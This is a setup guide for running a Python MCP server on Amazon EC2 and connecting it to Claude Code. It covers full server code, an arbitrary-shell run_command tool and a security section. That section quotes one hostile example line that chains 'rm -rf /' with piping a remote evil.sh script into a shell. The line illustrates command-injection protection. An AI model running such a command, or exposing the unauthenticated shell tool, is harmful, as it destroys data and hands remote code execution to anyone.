# Running an MCP Server on EC2 — Demo & Setup Guide

A working walkthrough for hosting a Model Context Protocol (MCP) server on an Amazon
EC2 instance and connecting to it from Claude Code over streamable HTTP.

**Verified on:** Amazon Linux 2023 · Python 3.11 · MCP Python SDK v2 · Claude Code 2.1.x
**Client OS:** Windows 11 / PowerShell

---

## 1. What this demo shows

A Python MCP server runs on EC2 and exposes tools in three groups:

| Tool | What it returns |
|------|-----------------|
| `disk_usage` | Root volume usage (`df -h /`) |
| `top_processes(limit)` | Top N processes by memory (`ps --sort=-%mem`) |
| `whoami` | The IAM identity the server operates as |
| `list_s3_buckets` | Buckets visible to the instance role |
| `list_s3_objects(bucket, prefix, limit)` | Object keys and sizes in one bucket |
| `list_ec2_instances(region)` | Instances with id, type, state, private IP |
| `describe_security_groups(region)` | Security groups and their inbound rules |
| `run_command(command, timeout)` | Arbitrary shell command — **see §8 first** |

Claude Code on the laptop connects by URL. Asking a plain-English question such as
*"How much disk space is left on my EC2 box, and what are the 3 heaviest processes?"*
causes Claude to select and call both tools, then answer with live data.

**The point of the demo:** the model picks tools purely from their descriptions —
there is no routing layer, no manual activation. A before/after is easy to stage:
run `claude mcp remove ec2demo`, ask the same question, and Claude can only guess.
Re-add the server and it answers with real numbers.

### Why streamable HTTP, not stdio

| Transport | How it works | Fits |
|-----------|--------------|------|
| **stdio** | Client spawns the server as a local subprocess | Local tools, Claude Desktop |
| **streamable HTTP** | Server is a long-running web service at a URL | Remote hosts, multiple clients |
| **SSE** | Predecessor to streamable HTTP | Deprecated — use HTTP |

Because the server lives on EC2 and the client is on a laptop, HTTP is the only
option that works. stdio servers don't stay running; they're spawned on demand by
the client and die with the session.

Config shape follows the transport: remote entries need `"type": "http"` plus a
`url`; local entries use `command` and `args` over stdio.

> **Where AWS's own servers land:** most awslabs MCP servers are **stdio**
> (`"command": "uvx"`), because they shell out to the AWS CLI using *your local*
> credentials. AWS Knowledge MCP Server is **remote HTTP** — it serves public docs,
> so nothing is credential-bound. The official AWS MCP server is a hybrid: a remote
> endpoint reached through `mcp-proxy-for-aws` running locally over stdio.
>
> The rule: **transport follows where the work has to happen.** Yours is HTTP
> because the tools must run *on the instance*. AWS's are stdio because theirs must
> run *where the credentials are*.

### Architecture

```
┌────────────────────────┐            ┌──────────────────────────────┐
│  Laptop                │            │  EC2 (Amazon Linux 2023)     │
│                        │            │                              │
│  Claude Code           │  HTTP POST │  uvicorn :8000               │
│  └── ec2demo ──────────┼───────────▶│  └── server.py (MCPServer)   │
│                        │  /mcp      │      ├── host tools          │
│                        │            │      └── AWS tools ──────────┼──▶ IMDS
└────────────────────────┘            └──────────────────────────────┘      │
        Security group: TCP 8000 from laptop's public IP /32            instance role
```

---

## 2. Step-by-step installation

### Step 1 — Launch the instance

- **AMI:** Amazon Linux 2023
- **Type:** `t3.micro` is plenty
- **Key pair:** create/select one and keep the `.pem` (e.g. `my-ec2-keypair.pem`)
- **Networking:** public subnet with **Auto-assign public IP = Enable**
- **Security group inbound:**
  - SSH (22) from your IP
  - Custom TCP **8000** from **your IP /32** — never `0.0.0.0/0`, this demo server
    has no authentication

### Step 2 — Prepare the key on Windows

Windows OpenSSH rejects private keys that other accounts can read. There is no
`chmod` in PowerShell; use `icacls`:

```powershell
cd C:\Users\<you>\Documents\LearnWithAI\PoC\CreateMCPServerOnEC2
icacls .\my-ec2-keypair.pem /inheritance:r
icacls .\my-ec2-keypair.pem /grant:r "$($env:USERNAME):(R)"
icacls .\my-ec2-keypair.pem          # verify: only your account listed
```

### Step 3 — Connect

```powershell
ssh -i .\my-ec2-keypair.pem ec2-user@<EC2_PUBLIC_IP>
```

### Step 4 — Install the toolchain

```bash
sudo dnf install -y python3.11 python3.11-pip git
mkdir ~/demo-mcp && cd ~/demo-mcp
python3.11 -m venv .venv && source .venv/bin/activate
pip install "mcp[cli]" boto3
```

Two notes:

- `pip install "mcp[cli]"` now resolves to **SDK v2**. Write v2 code (below), or pin
  `"mcp[cli]>=1.28,<2"` if you must run older examples.
- `boto3` must go in the **venv**. Amazon Linux ships boto3 for the system Python,
  but the venv is isolated from it — skipping this gives
  `ModuleNotFoundError: No module named 'boto3'`.

### Step 5 — Attach an IAM role to the instance

EC2 console → instance → **Actions → Security → Modify IAM role**.

For this demo use `ReadOnlyAccess`, or tighter: `sts:GetCallerIdentity`,
`s3:ListAllMyBuckets`, `s3:ListBucket`, `ec2:DescribeInstances`,
`ec2:DescribeSecurityGroups`. **Never `AdministratorAccess`.**

No restart needed — boto3 picks the role up on the next call via IMDS. This is the
real payoff of running on EC2: **no credentials are stored on the instance**, and
tools can reach private-subnet resources (RDS, internal ALBs, VPC endpoints) that a
locally-run stdio server cannot touch without a VPN.

### Step 6 — Write the server

See §3 for the complete file. Then:

```bash
python server.py
```

Expected output:

```
INFO:     Started server process [26942]
INFO:     StreamableHTTP session manager started
INFO:     Application startup complete.
INFO:     Uvicorn running on http://0.0.0.0:8000 (Press CTRL+C to quit)
```

This is a **foreground** process: it dies when you press Ctrl-C or close the SSH
session, and won't restart after a reboot. Fine for a demo. Open a second SSH
session for other commands. See §6 for keeping it alive.

### Step 7 — Test the connection from the laptop

**TCP reachability** — proves the security group and routing are correct:

```powershell
Test-NetConnection -ComputerName <EC2_PUBLIC_IP> -Port 8000
```

Look for `TcpTestSucceeded : True`.

**MCP endpoint** — proves the process on that port really speaks MCP:

```powershell
$body = '{"jsonrpc":"2.0","id":1,"method":"tools/list","params":{}}'
Invoke-RestMethod -Uri "http://<EC2_PUBLIC_IP>:8000/mcp" -Method Post -Body $body `
  -Headers @{ "Accept" = "application/json, text/event-stream" } `
  -ContentType "application/json"
```

Expected response:

```json
{"jsonrpc":"2.0","id":null,"error":{"code":-32600,"message":"Bad Request: Missing session ID"}}
```

**This error means success.** A JSON-RPC error proves a live MCP server parsed the
request. It refuses only because the server is stateful: clients must call
`initialize` first and carry the returned `Mcp-Session-Id` header on every later
request. Claude Code does that handshake automatically.

### Step 8 — Register with Claude Code

```powershell
claude mcp add --transport http ec2demo http://<EC2_PUBLIC_IP>:8000/mcp
claude mcp list
```

Expect `ec2demo ✔ Connected`.

`claude mcp add` only writes a config entry — nothing is contacted and no connection
is made. A broken server therefore shows up when you next start `claude`, not when
you add it.

### Step 9 — Demo it

Start `claude` and ask, in order:

1. *"What IAM identity is the EC2 server running as?"* → `whoami`, proves the
   instance role chain works before anything else is tested.
2. *"How much disk space is left, and what are the 3 heaviest processes?"* →
   `disk_usage` + `top_processes(limit=3)`.
3. *"List my S3 buckets and any running instances in ap-northeast-1."* →
   `list_s3_buckets` + `list_ec2_instances`.

Keep the EC2 terminal visible — `POST /mcp` lines appear in the uvicorn log as each
tool is called.

---

## 3. The complete `server.py`

```python
import shlex
import subprocess
import boto3
from botocore.exceptions import ClientError
from mcp.server import MCPServer

mcp = MCPServer("ec2-demo")          # no host/port here anymore


# ---------------------------------------------------------------- host tools

@mcp.tool()
def disk_usage() -> str:
    """Return current disk usage of the EC2 instance root volume.
    Use when asked about free space or storage on the server."""
    return subprocess.run(["df", "-h", "/"], capture_output=True, text=True).stdout


@mcp.tool()
def top_processes(limit: int = 5) -> str:
    """Return the top N processes on the EC2 instance ordered by memory usage.
    limit: how many processes to return (1-20). Does not kill or modify processes."""
    if not 1 <= limit <= 20:
        return "Error: limit must be between 1 and 20."
    out = subprocess.run(["ps", "-eo", "pid,comm,%mem,%cpu", "--sort=-%mem"],
                         capture_output=True, text=True).stdout.splitlines()
    return "\n".join(out[: limit + 1])


# ----------------------------------------------------------------- AWS tools
# All read-only. Credentials come from the EC2 instance role via IMDS —
# nothing is stored on the instance.

@mcp.tool()
def whoami() -> str:
    """Return the IAM identity this server operates as (account, ARN, user ID).
    Use to confirm which role's permissions the AWS tools run with.
    Read-only: makes no changes to any AWS resource."""
    try:
        r = boto3.client("sts").get_caller_identity()
        return f"Account: {r['Account']}\nARN: {r['Arn']}\nUserId: {r['UserId']}"
    except ClientError as e:
        return f"AWS error: {e.response['Error']['Code']} - {e.response['Error']['Message']}"


@mcp.tool()
def list_s3_buckets() -> str:
    """List S3 bucket names and creation dates visible to this instance's IAM role.
    Read-only: does not create, modify, or delete buckets or objects.
    Does not list objects inside a bucket — use list_s3_objects for that."""
    try:
        buckets = boto3.client("s3").list_buckets()["Buckets"]
        if not buckets:
            return "No buckets visible to this role."
        return "\n".join(f"{b['Name']}  ({b['CreationDate']:%Y-%m-%d})" for b in buckets)
    except ClientError as e:
        return f"AWS error: {e.response['Error']['Code']} - {e.response['Error']['Message']}"


@mcp.tool()
def list_s3_objects(bucket: str, prefix: str = "", limit: int = 20) -> str:
    """List object keys and sizes in one S3 bucket.
    bucket: exact bucket name. prefix: optional key prefix filter.
    limit: max objects to return (1-100).
    Read-only: does not upload, delete, or download object contents."""
    if not 1 <= limit <= 100:
        return "Error: limit must be between 1 and 100."
    try:
        r = boto3.client("s3").list_objects_v2(
            Bucket=bucket, Prefix=prefix, MaxKeys=limit)
        objs = r.get("Contents", [])
        if not objs:
            return f"No objects in {bucket} with prefix '{prefix}'."
        return "\n".join(f"{o['Key']}  {o['Size']} bytes" for o in objs)
    except ClientError as e:
        return f"AWS error: {e.response['Error']['Code']} - {e.response['Error']['Message']}"


@mcp.tool()
def list_ec2_instances(region: str = "ap-northeast-1") -> str:
    """List EC2 instances in one region with id, type, state, and private IP.
    region: AWS region code, e.g. ap-northeast-1.
    Read-only: does not start, stop, terminate, or modify any instance."""
    try:
        res = boto3.client("ec2", region_name=region).describe_instances()
        rows = []
        for r in res["Reservations"]:
            for i in r["Instances"]:
                name = next((t["Value"] for t in i.get("Tags", [])
                             if t["Key"] == "Name"), "-")
                rows.append(f"{i['InstanceId']}  {name}  {i['InstanceType']}  "
                            f"{i['State']['Name']}  {i.get('PrivateIpAddress', '-')}")
        return "\n".join(rows) if rows else f"No instances in {region}."
    except ClientError as e:
        return f"AWS error: {e.response['Error']['Code']} - {e.response['Error']['Message']}"


@mcp.tool()
def describe_security_groups(region: str = "ap-northeast-1") -> str:
    """List security groups in one region with their inbound rules.
    region: AWS region code, e.g. ap-northeast-1.
    Read-only: does not create, authorize, or revoke any rule."""
    try:
        sgs = boto3.client("ec2", region_name=region).describe_security_groups()
        rows = []
        for sg in sgs["SecurityGroups"]:
            rows.append(f"{sg['GroupId']}  {sg['GroupName']}")
            for p in sg.get("IpPermissions", []):
                ports = f"{p.get('FromPort', 'all')}-{p.get('ToPort', 'all')}"
                cidrs = ",".join(c["CidrIp"] for c in p.get("IpRanges", [])) or "-"
                rows.append(f"    {p.get('IpProtocol')} {ports} from {cidrs}")
        return "\n".join(rows) if rows else f"No security groups in {region}."
    except ClientError as e:
        return f"AWS error: {e.response['Error']['Code']} - {e.response['Error']['Message']}"


# ------------------------------------------------------------ DANGEROUS tool
# Arbitrary shell execution. Do not expose this on an unauthenticated
# endpoint — see §8 before enabling.

@mcp.tool()
def run_command(command: str, timeout: int = 30) -> str:
    """Run a shell command on the EC2 instance and return its stdout and stderr.
    command: the full command line to execute, e.g. 'systemctl status nginx'.
    timeout: seconds to wait before killing the process (1-120).
    Runs as the ec2-user account with that user's permissions. Output is
    truncated to 10000 characters. Does not support interactive commands,
    shell pipelines requiring a TTY, or commands needing sudo password input."""
    if not 1 <= timeout <= 120:
        return "Error: timeout must be between 1 and 120 seconds."
    try:
        argv = shlex.split(command)
    except ValueError as e:
        return f"Error: could not parse command - {e}"
    if not argv:
        return "Error: empty command."
    try:
        p = subprocess.run(argv, capture_output=True, text=True, timeout=timeout)
    except FileNotFoundError:
        return f"Error: command not found: {argv[0]}"
    except subprocess.TimeoutExpired:
        return f"Error: command exceeded {timeout}s and was killed."
    out = f"exit code: {p.returncode}\n--- stdout ---\n{p.stdout}"
    if p.stderr:
        out += f"\n--- stderr ---\n{p.stderr}"
    return out[:10000]


if __name__ == "__main__":
    mcp.run(transport="streamable-http", host="0.0.0.0", port=8000)
```

---

## 4. How the schema is generated

No JSON Schema is written by hand. The SDK derives it from type hints and defaults:

```python
def run_command(command: str, timeout: int = 30) -> str:
```

becomes

```json
{
  "type": "object",
  "properties": {
    "command": {"type": "string"},
    "timeout": {"type": "integer", "default": 30}
  },
  "required": ["command"]
}
```

**The presence or absence of a default sets `required`.** `command` has no default,
so the function can't be called without it → required. `timeout = 30` has one → not
required, and `30` becomes the schema default. Claude Code renders that array as the
`(required)` marker in `/mcp` output.

The docstring becomes the `description`; the signature becomes the schema. They are
independent.

**Consequence worth knowing:** `region: str = "ap-northeast-1"` means the model will
often omit the argument and silently accept your default. Drop the default if you
want the region stated explicitly every time.

### Tool description rules this file follows

- **What it does** — one specific sentence.
- **Input formats and constraints** — stated per parameter.
- **What it returns** — the shape of the response.
- **Negative boundaries** — "does not kill or modify processes", "does not list
  objects inside a bucket". This is the part most developers omit, and it's what
  stops the model over-selecting a tool.
- **Descriptive parameter names** — `limit`, `bucket`, `region`, not `n` or `arg`.

**Errors are returned as readable text, not raised.** A tool that throws gives the
model nothing to work with; `AccessDenied: User is not authorized to perform
s3:ListAllMyBuckets` tells it exactly what went wrong and that retrying won't help.

### Tool count

This file has **eight** tools, which is over the comfortable limit. Past roughly 4–5
tools per agent, selection reliability degrades on decision complexity alone —
sharpening descriptions doesn't fix it. `run_command` also overlaps `disk_usage` and
`top_processes`, so Claude may reach for the generic one.

Fine for a demo. If it bothers you, either drop the two specific host tools (
`run_command` subsumes them) or split into focused servers by role.

---

## 5. Scope: who gets the server

| Scope | File | Shared with |
|-------|------|-------------|
| `local` (default) | `~/.claude.json` | You, this project only |
| `user` | `~/.claude.json` | You, every project |
| `project` | `.mcp.json` in repo root | Everyone who clones the repo |

Scope is fixed when the server is added; changing it means remove and re-add. Add
`--scope project` when the whole team should get the server.

---

## 6. Handy commands

**On the instance:**

```bash
df -h /                                        # root volume (what disk_usage runs)
df -h                                          # all filesystems
du -h --max-depth=1 / 2>/dev/null | sort -h    # biggest directories
ps -eo pid,comm,%mem,%cpu --sort=-%mem | head -11   # top 10 by memory (+header)
python -m py_compile server.py                 # syntax check before running
```

**Claude Code:**

```powershell
claude mcp list              # status of every configured server
claude mcp get ec2demo       # details for one
claude mcp remove ec2demo    # for the before/after demo
```

**Keeping the server running — Option A (survive the SSH session):**

```bash
nohup python server.py > server.log 2>&1 &
echo $!          # note the PID
tail -f server.log
# stop with: kill <PID>   or   pkill -f server.py
```

`tmux` works well too: `tmux new -s mcp`, run the server, `Ctrl-B` then `D` to
detach, `tmux attach -t mcp` to return.

**Option B (survive a reboot):**

```bash
sudo tee /etc/systemd/system/demo-mcp.service <<'EOF'
[Unit]
Description=Demo MCP Server
After=network.target

[Service]
User=ec2-user
WorkingDirectory=/home/ec2-user/demo-mcp
ExecStart=/home/ec2-user/demo-mcp/.venv/bin/python /home/ec2-user/demo-mcp/server.py
Restart=always

[Install]
WantedBy=multi-user.target
EOF

sudo systemctl daemon-reload
sudo systemctl enable --now demo-mcp
journalctl -u demo-mcp -n 20
```

---

## 7. Troubleshooting

| Symptom | Cause | Fix |
|---------|-------|-----|
| `ModuleNotFoundError: No module named 'mcp.server.fastmcp'` | v1 code on SDK v2 | `from mcp.server import MCPServer` — see §9 |
| `ModuleNotFoundError: No module named 'boto3'` | boto3 installed system-wide, not in venv | `source .venv/bin/activate && pip install boto3` |
| `MCPServer.__init__() got an unexpected keyword argument 'port'` | Transport args on constructor | Move `host`/`port` to `run()` |
| `SyntaxError: unexpected character after line continuation character` | Stray `\` before `]` from a bad copy-paste | `sed -i 's/"\\\]/"]/g' server.py`, then `python -m py_compile server.py` |
| `Warning: Identity file mykey.pem not accessible` then `Permission denied (publickey)` | `-i` path wrong, so SSH fell back to default keys | Use the real `.pem` path |
| `Permission denied (publickey)` with a valid key | Wrong login user, or key ≠ instance key pair | `ec2-user` on Amazon Linux, `ubuntu` on Ubuntu |
| `UNPROTECTED PRIVATE KEY FILE` | Key readable by other Windows accounts | `icacls` commands in Step 2 |
| `TcpTestSucceeded : False` | SG rule, route table, or corporate firewall | Check SG has 8000 from your `/32` |
| HTTP `406 Not Acceptable` | Missing `Accept` header | Send `application/json, text/event-stream` |
| `Bad Request: Missing session ID` | No `initialize` handshake | Expected from curl; not an error for Claude Code |
| Blank hanging terminal after `ssh -N` | That's success — `-N` opens no shell | Leave it open |
| AWS tool returns `AccessDenied` | Instance role lacks the permission | Widen the role, or accept the boundary |
| AWS tool returns `NoCredentialsError` | No IAM role attached to the instance | Step 5 |
| Claude Code reports zero tools after redeploy | Server crashed at import | Read the EC2 log — the client only shows a generic connection failure |

### Making the endpoint curl-friendly

For scripted health checks, run stateless so each POST stands alone:

```python
mcp.run(transport="streamable-http", host="0.0.0.0", port=8000, stateless_http=True)
```

The `tools/list` command from Step 7 then returns the tool list directly.

---

## 8. Security — read before enabling `run_command`

The setup above is deliberately minimal. As written, **anyone who can reach port
8000 gets shell execution as `ec2-user` plus your instance role's AWS permissions**,
with no authentication at all. That is a textbook confused deputy: the server holds
credentials the caller was never authenticated for.

### Close the exposure — pick one

**Option A — bind to localhost and tunnel** (simplest; the port stops being
reachable at all):

```python
mcp.run(transport="streamable-http", host="127.0.0.1", port=8000)
```

```powershell
ssh -i .\my-ec2-keypair.pem -N -L 8000:localhost:8000 ec2-user@<EC2_PUBLIC_IP>
claude mcp add --transport http ec2demo http://localhost:8000/mcp
```

Then **remove the port 8000 security group rule entirely** — only SSH stays open.

**Option B — bearer token**, if you want to keep it direct. Wrap the app in
middleware that checks an `Authorization` header, then:

```powershell
claude mcp add --transport http ec2demo http://<EC2_PUBLIC_IP>:8000/mcp `
  --header "Authorization: Bearer $TOKEN"
```

Keep the token out of git using `${VAR}` expansion in `.mcp.json`;
`${VAR:-default}` gives paths a sensible fallback.

### Still missing

- **No TLS.** Plain HTTP over the public internet. Put it behind an ALB with an ACM
  certificate.
- **IP-pinned access.** The SG allows your current public IP, which changes when you
  switch networks.
- **Over-broad role.** Trim to `ReadOnlyAccess` or narrower — especially with
  `run_command` present, since the model can then call the `aws` CLI directly rather
  than only your typed tools.
- **`shell=True` is deliberately absent.** `run_command` uses `shlex.split` and
  passes an argv list, so `rm -rf /; curl evil.sh | sh` won't chain. Pipes and
  redirects don't work either — that's the trade. Turning on `shell=True` restores
  them and removes the only structural protection in the tool.
- **Never interpolate model-supplied strings into commands** in the AWS tools. Use
  boto3 with typed parameters, as above.

**After the demo:** remove the port 8000 SG rule, detach the IAM role, and stop or
terminate the instance.

### If you want broad AWS coverage

Don't hand-write dozens of tools — run the awslabs AWS API MCP Server. It's stdio,
so it can't be reached from your laptop directly. Either SSH in and run Claude Code
*on the instance* (simplest, stdio works normally), or front it with a proxy to
expose HTTP — the same pattern AWS uses with `mcp-proxy-for-aws`.

---

## 9. SDK v1 → v2 migration cheat sheet

SDK v2 went stable on 2026-07-28. `FastMCP` was renamed to `MCPServer` and the old
import path was **removed outright** — no deprecation shim, so every v1 server fails
at import.

| v1 | v2 |
|----|----|
| `from mcp.server.fastmcp import FastMCP` | `from mcp.server import MCPServer` |
| `FastMCP("Demo")` | `MCPServer("Demo")` |
| `mcp.server.fastmcp.*` | `mcp.server.mcpserver.*` |
| `ctx.fastmcp` | `ctx.mcp_server` |
| `mcp.get_context()` | declare a `ctx: Context` parameter |
| `FastMCP("Demo", port=8000)` | `mcp.run(transport=..., port=8000)` |
| `tool.inputSchema` | `tool.input_schema` (all fields snake_case) |
| `FastMCPError` | `MCPServerError` |

`@mcp.tool()`, `@mcp.resource()` and type-hint-derived schemas are unchanged, so for
a decorator-built server the rename is most of the port.

**Pin your dependency.** The reason this broke so many servers at once was an
unbounded `mcp>=1.x` silently resolving to 2.0.0 on a fresh install. Use
`mcp>=2,<3` (or `>=1.28,<2` to stay on v1, which still gets security patches).
awslabs migrated their whole server fleet to v2 and dropped the `<2.0.0` ceiling.

---

## 10. References

- MCP Python SDK — https://py.sdk.modelcontextprotocol.io/
- Migration Guide v1 → v2 — https://py.sdk.modelcontextprotocol.io/migration/
- What's new in v2 — https://py.sdk.modelcontextprotocol.io/whats-new/
- Running your server (transports) — https://gofastmcp.com/deployment/running-server
- AWS MCP servers — https://github.com/awslabs/mcp
- AWS MCP installation — https://awslabs.github.io/mcp/installation
